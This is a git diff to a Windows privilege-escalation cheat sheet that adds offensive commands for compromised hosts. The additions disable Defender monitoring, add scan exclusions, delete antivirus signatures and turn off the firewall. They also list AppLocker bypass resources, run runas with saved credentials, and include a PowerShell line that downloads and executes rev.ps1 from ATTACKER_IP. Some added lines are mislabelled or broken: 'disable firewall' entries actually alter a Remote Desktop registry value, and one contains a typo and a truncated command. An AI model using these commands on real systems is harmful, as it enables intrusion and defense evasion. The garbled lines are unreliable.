@@ -8,6 +8,7 @@
 * [Network Enumeration](#network-enumeration)
 * [Antivirus & Detections](#antivirus--detections)
     * [Windows Defender](#windows-defender)
+    * [Firewall](#firewall)
     * [AppLocker Enumeration](#applocker-enumeration)
     * [Powershell](#powershell)
     * [Default Writeable Folders](#default-writeable-folders)
@@ -97,6 +98,11 @@
     python3 wes.py --update
     python3 wes.py systeminfo.txt
     ```
+- [PrivescCheck - Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)
+    ```powershell
+    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
+    ```
 
 ## Windows Version and Configuration
 
@@ -184,6 +190,14 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
 ```
 
+Get Domain Controllers
+
+```powershell
+nltest /DCLIST:DomainName
+nltest /DCNAME:DomainName
+nltest /DSGETDC:DomainName
+```
+
 ## Network Enumeration
 
 List all network interfaces, IP, and DNS.
@@ -214,30 +228,6 @@ List all current connections
 netstat -ano
 ```
 
-List firewall state and current configuration
-
-```powershell
-netsh advfirewall firewall dump
-
-or 
-
-netsh firewall show state
-netsh firewall show config
-```
-
-List firewall's blocked ports
-
-```powershell
-$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
-```
-
-Disable firewall
-
-```powershell
-netsh firewall set opmode disable
-netsh advfirewall set allprofiles state off
-```
-
 List all network shares
 
 ```powershell
@@ -262,7 +252,7 @@ Enumerate antivirus on a box with `WMIC /Node:localhost /Namespace:\\root\Securi
 # check status of Defender
 PS C:\> Get-MpComputerStatus
 
-# disable Real Time Monitoring
+# disable scanning all downloaded files and attachments, disable AMSI (reactive)
 PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
 PS C:\> Set-MpPreference -DisableIOAVProtection $true
 
@@ -272,18 +262,59 @@ PS C:\> Set-MpPreference -DisableScriptScanning 1
 # exclude a folder
 PS C:\> Add-MpPreference -ExclusionPath "C:\Temp"
 PS C:\> Add-MpPreference -ExclusionPath "C:\Windows\Tasks"
+PS C:\> Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
+
+# remove signatures (if Internet connection is present, they will be downloaded again):
+PS > "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
 ```
+
+### Firewall
+
+List firewall state and current configuration
+
+```powershell
+netsh advfirewall firewall dump
+# or 
+netsh firewall show state
+netsh firewall show config
+```
+
+List firewall's blocked ports
+
+```powershell
+$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
+```
+
+Disable firewall
+
+```powershell
+# Disable Firewall on Windows 7 via cmd
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server"  /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+# Disable Firewall on Windows 7 via Powershell
+powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value'`
+
+# Disable Firewall on any windows via cmd
+netsh firewall set opmode disable
+netsh Advfirewall set allprofiles state off
+```
+
 
 ### AppLocker Enumeration
 
 - With the GPO
 - HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script).
 
-List AppLocker rules
 
-```powershell
-PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-```
+* List AppLocker rules
+    ```powershell
+    PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+    ```
+
+* Applocker Bypass
+    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
+    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md
+    * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md
 
 ### Powershell
 
@@ -293,6 +324,22 @@ Default powershell locations in a Windows system.
 C:\windows\syswow64\windowspowershell\v1.0\powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell
 ```
+
+Powershell Constrained Mode
+
+```powershell
+# Check if we are in a constrained mode
+$ExecutionContext.SessionState.LanguageMode
+
+PS > &{ whoami }
+powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
+
+# PowerShDLL - Powershell with no Powershell.exe via DLL’s
+# https://github.com/p3nt4/PowerShdll
+ftp> rundll32.exe C:\temp\PowerShdll.dll,main
+```
+
+
 
 Example of AMSI Bypass.
 
@@ -307,7 +354,9 @@ PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetF
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
-C:\windows\tracing
+C:\Windows\tracing
+C:\Windows\Temp
+C:\Users\Public
 ```
 
 ## EoP - Looting for passwords
@@ -859,6 +908,7 @@ Then you can use `runas` with the `/savecred` options in order to use the saved 
 The following example is calling a remote binary via an SMB share.
 ```powershell
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+runas /savecred /user:Administrator "cmd.exe /k whoami"
 ```
 
 Using `runas` with a provided set of credential.
